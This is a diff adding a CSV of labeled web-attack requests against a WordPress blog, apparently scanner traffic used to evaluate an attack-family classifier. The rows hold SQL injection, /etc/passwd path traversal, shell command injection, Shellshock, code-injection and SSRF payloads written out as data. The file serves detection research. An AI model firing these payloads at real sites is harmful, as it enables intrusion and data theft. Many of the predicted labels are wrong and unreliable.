@@ -1,0 +1,106 @@
+,http_method,dec,family_label,pred_family
+0,GET,/blog/index.php/2020/03/HTTP://www.google.com:80//distinctio-sequi-officiis-occaecati/feed  ,ssrf,scan
+1,GET,"/blog/index.php/2020 UNION ALL SELECT NULL,NULL,NULL,NULL#/03/22/quidem-rerum-sit-doloribus-quia-eum/embed  ",sqli,sqli
+2,GET,/blog/index.php/2020/03/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));/fuga-aut-recusandae-sed-dolor-quia  ,cmd_injection,scan
+3,GET,"/blog/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/2020/03/29  ",sqli,sqli
+4,GET,/blog/index.php/2020/04/http://www.google.com:80//voluptas-alias-ut-iure-dicta-aliquid-corrupti/feed  ,ssrf,scan
+5,GET,/blog/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}/css/dashicons.min.css ver=4.9.5 ,ssti,scan
+6,GET,/blog/index.php/HTTP://www.google.com//edit-profile/{{ data.editLink }}&image-editor  ,ssrf,scan
+7,GET,/blog/wp-content/plugins/user-registration/assets//../../../../../../../../../../../../../../../../etc/passwd/frontend/my-account.min.js ver=1.8.2.1 ,path_traversal,ssrf
+8,GET,/blog/index.php/2020 UNION ALL select NULL -- /04/04/consequatur-ad-error-quidem/embed  ,sqli,scan
+9,GET,/blog/index.php/2020') AND 2381=1633-- -/03/27/qui-ratione-maxime-dolores-consequatur  ,sqli,scan
+10,GET,/www.google.com/search?q=OWASP meaning/index.php/aliquam-odio-a-labore-magnam-quam-quis  ,ssrf,scan
+11,GET,/blog/wp-content||sleep 15/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg  ,cmd_injection,scan
+12,GET,/blog/index.php/2020/03')) AND 2968=2968-- -/27  ,sqli,scan
+13,GET,"/blog"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -/index.php/2020/03  ",sqli,sqli
+14,GET,/blog/index.php/2020/03/29/https://www.google.com/search?q=OWASP difficulty  ,ssrf,scan
+15,GET,"/blog/index.php/2020/04"" AND ""1""=""2"" -- /04/consequatur-ad-error-quidem  ",sqli,scan
+16,GET,/blog / sleep(15) /index.php/my-account/edit-profile/{{ attachment.url  ,cmd_injection,scan
+17,GET,/blog/wp-content/uploads' OR '1'='1/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3-1024x682.jpg  ,sqli,scan
+18,GET,/blog/wp-content/themes UNION ALL select NULL -- /twentyseventeen/assets/images  ,sqli,scan
+19,GET,/blog/index.php/2020/04/04/voluptas-alias-ut-iure-dicta-aliquid-corrupti AND 1=2/embed  ,sqli,scan
+20,GET,"/blog/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#/2020/03/27  ",sqli,sqli
+21,GET,/blog/index.php/page/http://www.google.com:80/  ,ssrf,scan
+22,GET,/blog/index.php/2020/04 or 0 in (select sleep(15) ) -- /04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum/embed  ,sqli,scan
+23,GET,"/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#  ",sqli,sqli
+24,GET,"/blog') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed  ",sqli,sqli
+25,POST,/blog/index.php/my-account/edit-profile/  username=yearningGatorade4&password=&J336Nvs&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/&login=www.google.com:80/&redirect=&rememberme=forever,other,scan
+26,GET,"/blog/any
+Set-cookie: Tamper=4063d31c-95a0-4120-8ae6-67b579ba879e/plugins/user-registration/assets/css/user-registration-smallscreen.css ver=1.8.2.1 ",other,scan
+27,GET,/blog/wp-content/uploads/2020/04/f51dfb19-3fe8-380e-91a6-3912fdae661e.jpg%'  --   ,sqli,scan
+28,GET,/blog/index.php/2020/04/https://www.google.com:80/search?q=OWASP success  ,ssrf,scan
+29,POST,/blog/index.php/my-account/edit-password/  username=importedWildfowl6&password=#vFxwNt&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-password/&login=Login&redirect=&rememberme=forever OR 1=1,other,scan
+30,GET,"/blog/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/2020/03/22  ",sqli,sqli
+31,GET,/blog/index.php/2020/https://www.google.com:80/search?q=OWASP truth/04/consequatur-ad-error-quidem/embed  ,ssrf,scan
+32,POST,"/blog"" AND ""1""=""1/index.php/my-account  username=rafael&password=españa01&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/&login=Login&redirect=",sqli,scan
+33,GET,/blog/index.php/../../../../../../../../../../../../../../../../etc/passwd/04/04/hic-porro-nihil-non-rerum/feed  ,path_traversal,ssrf
+34,GET,/blog/wp-login.php loggedout=http://www.google.com ,ssrf,scan
+35,GET,/blog/wp-includes/js/plupload OR 1=1/moxie.min.js ver=1.3.5 ,sqli,scan
+36,GET,/blog/wp-content/uploads//../../../../../../../../../../../../../../../..//04/4b6aa405-8ac7-33d8-9366-43fcef53f97a.png  ,path_traversal,ssrf
+37,GET,/\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/wp-content/plugins/user-registration/assets/css/user-registration.css ver=1.8.2.1 ,path_traversal,scan
+38,GET,/blog' UNION ALL select NULL -- /index.php/et-vel-qui-explicabo-autem-rerum-nisi  ,sqli,nosql_injection
+39,POST,"/blog/wp-login.php action=register user_login=jubilantDotterel9%""  -- &user_email=foo-bar@example.com&redirect_to=&wp-submit=Register",sqli,scan
+40,GET,"/blog/index.php/2020"") RLIKE (SELECT (CASE WHEN (7659=6824) THEN 2020 ELSE 0x28 END)) AND (""drRo""=""drRo/03/22/quidem-rerum-sit-doloribus-quia-eum/feed  ",sqli,scan
+41,GET,/blog/wp-includes/js OR 1=1 -- /mediaelement/mediaelementplayer-legacy.min.css ver=4.2.6-78496d1 ,sqli,scan
+42,POST,/blog/index.php/my-account/user-logout/  username=mellowViper5&password=8NOm$y&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/user-logout/&login=/../../../../../../../../../../../../../../../../etc/passwd&redirect=&rememberme=forever,other,ssrf
+43,GET,"/any
+Set-cookie: Tamper=685026d4-08cd-4d45-ad40-a4466cd6a669/index.php/sample-page/nulla-quisquam-est-ut-nemo/feed  ",other,scan
+44,GET,"/blog/any
+Set-cookie: Tamper=05980178-4c61-4a54-8e0a-e7d44f1a020b/themes/twentyseventeen/assets/js  ",other,scan
+45,GET,/https://www.google.com:80/search?q=OWASP temperature/index.php/author/vbechtelar/feed  ,ssrf,scan
+46,GET,/blog/index.php/sample-page/amet-et-deleniti-tenetur-minima' or 0 in (select sleep(15) ) --   ,sqli,nosql_injection
+47,GET,/blog/wp-includes/js/jquery/ui/core.min.js ver=1.11.4`sleep 15` ,cmd_injection,scan
+48,GET,"/blog/index.php/2020/03/23%') AND (SELECT 8346 FROM(SELECT COUNT(*),CONCAT(0x3a727a613a,(SELECT (ELT(8346=8346,1))),0x3a6172743a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('%'=  ",sqli,scan
+49,GET,/blog/index.php/2020/03/23;(SELECT * FROM (SELECT(SLEEP(5)))eQzM)#/fuga-aut-recusandae-sed-dolor-quia  ,sqli,scan
+50,GET,/blog/index.php/2020/../../../../../../../../../../../../../../../..//04/hic-porro-nihil-non-rerum  ,path_traversal,ssrf
+51,GET,/http://www.google.com/search?q=OWASP temperature/index.php/fugiat-recusandae-voluptatem-ratione-quo-placeat/feed  ,ssrf,scan
+52,GET,"/blog/index.php/wp-json"" OR ""1""=""1"" -- /oembed/1.0/embed format=xml&url=http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/ ",sqli,scan
+53,GET,/blog/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}/author/rosenbaum-lisette/feed  ,ssti,scan
+54,POST,/blog/index.php/registration/  first_name=ZAP&user_login=wakefulWildfowl1&user_pass=ZAP&user_confirm_password=1_YVYQ&last_name=ZAP&user_email=foo-bar@example.com&user_confirm_email=www.google.com/search?q=OWASP ZAP&ur-user-form-id=97&ur-redirect-url=&ur_frontend_form_nonce=371e07a3bf,scan,scan
+55,GET,/blog/wp-content/uploads/https://www.google.com/04/914665e4-4fbd-3377-9747-d24ebaabf676-300x240.png  ,ssrf,scan
+56,GET,/blog||sleep 15/index.php/2020/03/27  ,cmd_injection,scan
+57,GET,/blog/wp-content/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\/2020/04/c88a75c6-b439-3e82-99dd-0aca7c568b15-1024x682.jpg  ,ssti,scan
+58,GET,"/blog' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/index.php/2020  ",sqli,sqli
+59,GET,/blog/index.php/my-account/\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/{{ data.sizes.large.url  ,path_traversal,ssrf
+60,GET,"/blog/wp-content/uploads/2020/any?
+Set-cookie: Tamper=e2bf5905-67d7-41f7-a05a-565d590f5759
+/aa129ea8-5161-37b5-acab-9d6386eeec9c.png  ",other,scan
+61,GET,/blog/wp-content/plugins/user-registration/assets' or 0 in (select sleep(15) ) -- /css/sweetalert2/sweetalert2.min.css ver=8.17.1 ,sqli,nosql_injection
+62,POST,/blog/index.php/my-account/edit-profile/post.php/ action=edit&post={{ data.id }}' / sleep(15) / ' username=sadRelish1&password=VgilYfkF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}&login=Login&redirect=&rememberme=forever,ssti,scan
+63,GET,"/blog/index.php/2020/03/22%') UNION ALL SELECT NULL,NULL#/quidem-rerum-sit-doloribus-quia-eum  ",sqli,scan
+64,GET,/blog/(/uploads/2020/04/f51dfb19-3fe8-380e-91a6-3912fdae661e.jpg  ,scan,scan
+65,GET,"/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/feed  ",sqli,sqli
+66,GET,/blog/index.php' AND 8273=8273-- -/2020/03/23/fuga-aut-recusandae-sed-dolor-quia  ,sqli,scan
+67,GET,/blog/index.php(/tag/nobis-perspiciatis-optio  ,scan,scan
+68,GET,/blog/index.php/my-account/user-logout/ _wpnonce=14237a84a5' UNION ALL select NULL --  ,sqli,scan
+69,GET,"/blog/index.php/2020') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/03/22  ",sqli,sqli
+70,POST,/() { :;}; echo 'X-Powered-By: ShellShock-Vulnerable'/index.php/my-account/edit-profile  username=lazyDoves3&password=PxJ#&5&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/&login=Login&redirect=&rememberme=forever,cmd_injection,scan
+71,GET,/blog/wp-includes/NULL/mediaelement/wp-mediaelement.min.css ver=4.9.5 ,scan,scan
+72,GET,/blog/index.php/2020/03/23' RLIKE (SELECT (CASE WHEN (7482=7482) THEN 23 ELSE 0x28 END)) AND 'FpRV'='FpRV/fuga-aut-recusandae-sed-dolor-quia  ,sqli,scan
+73,GET,"/blog/wp-includes/js/imgareaselect"" OR ""1""=""1  ",sqli,scan
+74,GET,"/blog/wp-content"" OR ""1""=""1  ",sqli,scan
+75,GET,/blog/index.php' AND '1'='1' -- /page/3 s ,sqli,scan
+76,GET,/blog/wp-content/uploads/2020/04 AND 1=1 -- /f74331ba-6a7e-37cc-aefe-7026be7b0c0b.png  ,sqli,scan
+77,GET,"/blog') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php/2020/03/27  ",sqli,sqli
+78,GET,/blog/wp-content/plugins/user-registration/assets/js/inputmask/jquery.inputmask.bundle.min.js ver=; ,scan,scan
+79,GET,/blog/wp-content//../../../../../../../../../../../../../../../..//user-registration/assets/css  ,path_traversal,ssrf
+80,GET,/blog`sleep 15`/index.php/aliquam-odio-a-labore-magnam-quam-quis/embed  ,cmd_injection,scan
+81,GET,/blog/wp-includes/js//../../../../../../../../../../../../../../../..//mediaelement-and-player.min.js ver=4.2.6-78496d1 ,path_traversal,ssrf
+82,GET,"/blog/index.php)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed  ",sqli,sqli
+83,GET,"/blog/index.php/2020/03/22"") AND (SELECT * FROM (SELECT(SLEEP(5)))jlgD) AND (""fXwg""=""fXwg/quidem-rerum-sit-doloribus-quia-eum  ",sqli,scan
+84,GET,/https://www.google.com//wp-content/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563.jpg  ,ssrf,scan
+85,GET,/blog/wp-content/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563.jpg and 0 in (select sleep(15) ) --   ,sqli,scan
+86,GET,"/blog/index.php/2020/03"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/23/fuga-aut-recusandae-sed-dolor-quia  ",sqli,sqli
+87,GET,"/blog/index.php/2020/03')) UNION ALL SELECT NULL,NULL-- -/22/quidem-rerum-sit-doloribus-quia-eum  ",sqli,sqli
+88,GET,/blog&sleep 15&/index.php/category/uncategorized/feed  ,cmd_injection,scan
+89,GET,"/blog/index.php/2020/03/22,(SELECT (CASE WHEN (8401=4714) THEN 1 ELSE 8401*(SELECT 8401 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))/quidem-rerum-sit-doloribus-quia-eum/embed  ",sqli,scan
+90,GET,/blog/wp-content/uploads/2020 OR 1=1/04/11020b88-e0d1-33fa-b269-b7e9f495b02b-1024x682.jpg  ,sqli,scan
+91,GET,"/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -  ",sqli,sqli
+92,GET,"/blog"") UNION ALL select NULL -- /wp-content/uploads/2020/04/38536cfd-4e8b-3340-b4c4-af387cc163a8.jpg  ",sqli,nosql_injection
+93,GET,/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}/index.php/tag/sapiente-blanditiis-quasi  ,ssti,scan
+94,GET,/'/index.php/my-account/edit-profile/{{ data.sizes.large.url  ,ssti,scan
+95,POST,/blog/wp-login.php action=lostpassword user_login=sheepishJaguar4&redirect_to=&wp-submit=Get New Password,other,scan
+96,GET,/blog/index.php/sample-page/nulla-quisquam-est-ut-nemo' OR '1'='1/embed  ,sqli,scan
+97,GET,/blog/www.google.com//themes/twentyseventeen/assets/images  ,ssrf,scan
+98,GET,/blog/wp-content/uploads' AND '1'='1' -- /2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg  ,sqli,scan
+99,GET,/blog%' AND SLEEP(5) AND '%'='/index.php/2020/03/23  ,sqli,scan
